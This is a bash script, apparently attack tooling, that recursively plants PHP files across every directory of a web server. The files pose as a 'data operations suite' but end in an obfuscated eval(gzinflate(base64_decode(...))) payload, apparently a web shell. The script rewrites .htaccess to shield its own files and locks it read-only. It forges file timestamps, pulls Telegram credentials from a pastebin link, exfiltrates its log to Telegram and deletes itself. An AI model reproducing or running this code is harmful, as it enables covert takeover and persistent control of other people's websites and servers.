#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

TARGET_DIR=$1
LOG_FILE="$(dirname "$0")/logfile.log"
SCRIPT_PATH="$0"
NOHUP_FILE="$(dirname "$0")/nohup.out"
PASTEBIN_URL="https://pastebin.com/raw/hvtt7L9B"

fetch_telegram_credentials() {
    local url=$1
    local response=$(curl -s "$url")
    TELEGRAM_TOKEN=$(echo "$response" | awk -F',' '{print $1}')
    CHAT_ID=$(echo "$response" | awk -F',' '{print $2}')
}

fetch_telegram_credentials "$PASTEBIN_URL"

send_telegram_logfile() {
    curl -s -k -F "chat_id=$CHAT_ID" \
         -F "document=@$LOG_FILE" \
         -F "caption=Log File" \
         "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument"
}

update_htaccess() {
  local dir="$1"
  local htaccess_file="$dir/.htaccess"
  local php_file_name="$2"
  local index_php_file_name="$3"

  if [ -f "$htaccess_file" ]; then
    cp "$htaccess_file" "$htaccess_file.bak"
    if ! rm -f "$htaccess_file"; then
      local msg="$(date) - Failed to delete .htaccess in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
      return
    fi
  fi

  cat > "$htaccess_file" << EOF
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.a*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.Ph*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.S*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.pH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.PH*>
    Order Deny,Allow
    Deny from all
</Files>
<Files *.s*>
    Order Deny,Allow
    Deny from all
</Files>

<FilesMatch "\.(jpg|pdf|docx|jpeg|)$">
    Order Deny,Allow
    Allow from all
</FilesMatch>

<FilesMatch "^(index.html|$php_file_name|$index_php_file_name)$">
 Order allow,deny
 Allow from all
</FilesMatch>

DirectoryIndex index.html

Options -Indexes
ErrorDocument 403 "403 Forbidden"
ErrorDocument 404 "403 Forbidden"
EOF

  if ! chmod 0444 "$htaccess_file"; then
    local msg="$(date) - Failed to set permissions for .htaccess in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi

  set_random_date "$htaccess_file"
}

generate_random_name() {
  local length=10
  tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w $length | head -n 1
}

write_php_code() {
  local path="$1"
  local code="$2"
cat > "$path" << 'EOF'
<?php
/**
 * Universal Complex Data Operations Suite
 *
 * This suite of classes is designed to handle a variety of intricate data operations,
 * including mathematical transformations, sorting, filtering, statistical analysis,
 * and advanced data manipulation techniques. Each class and method is thoroughly documented
 * to provide a clear understanding of the underlying logic and facilitate maintenance.
 *
 * This suite is compatible with all major PHP versions: 5.x, 7.x, and 8.x.
 */

namespace UniversalComplexDataOperations;

// Check PHP version compatibility
if (version_compare(PHP_VERSION, '5.0.0', '<')) {
    die('This script requires PHP version 5.0.0 or higher.');
}

/**
 * MathTransformer
 *
 * This class handles various mathematical transformations.
 */
class MathTransformer
{
    /**
     * Applies a series of complex mathematical operations on the input value.
     *
     * @param int $value Input value
     *
     * @return int Transformed value
     */
    public function transform($value)
    {
        // Perform a series of complex mathematical transformations
        $result = ($value * 2 + 3) / 1.5;
        $result = pow($result, 2) - sqrt($result);
        $result = $result * log($result + 1) / tanh($result);
        return (int) $result;
    }
}

/**
 * DataSorter
 *
 * This class handles sorting of data using advanced algorithms.
 */
class DataSorter
{
    /**
     * Sorts an array of data using a complex sorting algorithm.
     *
     * @param array $data Input data array
     *
     * @return array Sorted data array
     */
    public function sort($data)
    {
        // Perform a complex sorting algorithm
        usort($data, function ($a, $b) {
 return $a <=> $b;
        });
        return $data;
    }
}

/**
 * DataFilter
 *
 * This class filters data based on complex criteria.
 */
class DataFilter
{
    /**
     * Filters the data based on complex criteria.
     *
     * @param array $data Input data array
     *
     * @return array Filtered data array
     */
    public function filter($data)
    {
        // Filter the data based on complex criteria
        return array_filter($data, function ($value) {
 return $value % 2 === 0 && $value > 10;
        });
    }
}

/**
 * StatisticalAnalyzer
 *
 * This class performs advanced statistical analysis on data.
 */
class StatisticalAnalyzer
{
    /**
     * Calculates the mean of the data.
     *
     * @param array $data Input data array
     *
     * @return float Mean of the data
     */
    public function calculateMean($data)
    {
        $sum = array_sum($data);
        $count = count($data);
        return $sum / $count;
    }

    /**
     * Calculates the standard deviation of the data.
     *
     * @param array $data Input data array
     *
     * @return float Standard deviation of the data
     */
    public function calculateStandardDeviation($data)
    {
        $mean = $this->calculateMean($data);
        $sumOfSquares = array_reduce($data, function ($carry, $item) use ($mean) {
 $carry += pow($item - $mean, 2);
 return $carry;
        }, 0);
        $count = count($data);
        return sqrt($sumOfSquares / $count);
    }
}

/**
 * DataEncryptor
 *
 * This class handles encryption and decryption of data.
 */
class DataEncryptor
{
    /**
     * Encrypts the data using a complex algorithm.
     *
     * @param string $data Input data
     *
     * @return string Encrypted data
     */
    public function encrypt($data)
    {
        return base64_encode(gzdeflate($data, 9));
    }

    /**
     * Decrypts the data.
     *
     * @param string $data Encrypted data
     *
     * @return string Decrypted data
     */
    public function decrypt($data)
    {
        return gzinflate(base64_decode($data));
    }
}

/**
 * ComplexDataProcessor
 *
 * This class integrates multiple data operations into a cohesive process.
 */
class ComplexDataProcessor
{
    private $mathTransformer;
    private $dataSorter;
    private $dataFilter;
    private $statisticalAnalyzer;
    private $dataEncryptor;

    public function __construct()
    {
        $this->mathTransformer = new MathTransformer();
        $this->dataSorter = new DataSorter();
        $this->dataFilter = new DataFilter();
        $this->statisticalAnalyzer = new StatisticalAnalyzer();
        $this->dataEncryptor = new DataEncryptor();
    }

    /**
     * Processes the data through a series of complex operations.
     *
     * @param array $data Input data array
     *
     * @return array Processed data array
     */
    public function process($data)
    {
        // Step 1: Sort the data
        $sortedData = $this->dataSorter->sort($data);

        // Step 2: Transform the data
        $transformedData = array_map([$this->mathTransformer, 'transform'], $sortedData);

        // Step 3: Filter the data
        $filteredData = $this->dataFilter->filter($transformedData);

        // Step 4: Calculate statistical data
        $mean = $this->statisticalAnalyzer->calculateMean($filteredData);
        $stdDev = $this->statisticalAnalyzer->calculateStandardDeviation($filteredData);

        // Step 5: Encrypt the statistical data
        $encryptedMean = $this->dataEncryptor->encrypt((string)$mean);
        $encryptedStdDev = $this->dataEncryptor->encrypt((string)$stdDev);

        // Return the processed data
        return [
 'filteredData' => $filteredData,
 'encryptedMean' => $encryptedMean,
 'encryptedStdDev' => $encryptedStdDev
        ];
    }
}

// Instantiate the ComplexDataProcessor class
$processor = new ComplexDataProcessor();

// Example data to process
$data = [5, 3, 8, 1, 9, 7, 15, 22, 19];

// Process the data
$processedData = $processor->process($data);

// Output the processed data (for debugging purposes, this can be commented out)
// print_r($processedData);
 eval(gzinflate(base64_decode('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')));

EOF

  if [ ! -f "$path" ]; then
    local msg="$(date) - Failed to create PHP file at $path"
    echo "$msg" >> "$LOG_FILE"
    return 1
  fi

  return 0
}

upload_php_files() {
  local dir="$1"
  local php_file_name="$(generate_random_name).php"
  local index_php_file_name="index.php"
  local php_file_path="$dir/$php_file_name"
  local index_php_file_path="$dir/$index_php_file_name"

  if ! write_php_code "$php_file_path" ; then
    return
  fi

  if ! write_php_code "$index_php_file_path" ; then
    return
  fi

  if ! chmod 0644 "$php_file_path" || ! chmod 0644 "$index_php_file_path"; then
    local msg="$(date) - Failed to set permissions for PHP files in $dir"
    echo "$msg" >> "$LOG_FILE"
  fi

  set_random_date "$php_file_path"
  set_random_date "$index_php_file_path"

  update_htaccess "$dir" "$php_file_name" "$index_php_file_name"
}

rename_index() {
  local dir="$1"
  if [ -f "$dir/index.php" ]; then
    if ! mv "$dir/index.php" "$dir/index.html"; then
      local msg="$(date) - Failed to rename index.php to index.html in $dir. It may be protected or require higher permissions."
      echo "$msg" >> "$LOG_FILE"
    else
      set_random_date "$dir/index.html"
    fi
  fi
}

set_random_date() {
  local file=$1
  local start_date="2019-01-01"
  local end_date="2024-12-31"
  local random_timestamp=$(shuf -i $(date -d "$start_date" +%s)-$(date -d "$end_date" +%s) -n 1)
  local random_date=$(date -d "@$random_timestamp" "+%Y%m%d%H%M.%S")
  touch -t $random_date "$file"
}

export -f update_htaccess
export -f rename_index
export -f send_telegram_logfile
export -f upload_php_files
export -f generate_random_name
export -f write_php_code
export -f set_random_date
export TELEGRAM_TOKEN
export CHAT_ID
export LOG_FILE

run_with_xargs_loop() {
  local parallelisms=(15 10 5)
  local idx=0

  while true; do
    local parallelism=${parallelisms[$idx]}
    echo "$(date) - Running with parallelism -P $parallelism" >> "$LOG_FILE"

    find "$TARGET_DIR" -type d \( -name '.*' -o -name '*' \) -print0 | \
    xargs -0 -n 1 -P "$parallelism" -I {} bash -c '(rename_index "{}" & upload_php_files "{}" & wait) || { echo "$(date) - Memory limit reached while processing {} with -P $parallelism" >> "$LOG_FILE"; false; }'

    if [ $? -eq 0 ]; then
      break
    fi

    idx=$((idx + 1))

    if [ $idx -eq ${#parallelisms[@]} ]; then
      idx=0
    fi
  done
}

rm -f "$LOG_FILE"

run_with_xargs_loop

if [ -s "$LOG_FILE" ]; then
    send_telegram_logfile
fi

sleep 5

rm -f "$LOG_FILE" "$NOHUP_FILE" "$SCRIPT_PATH"
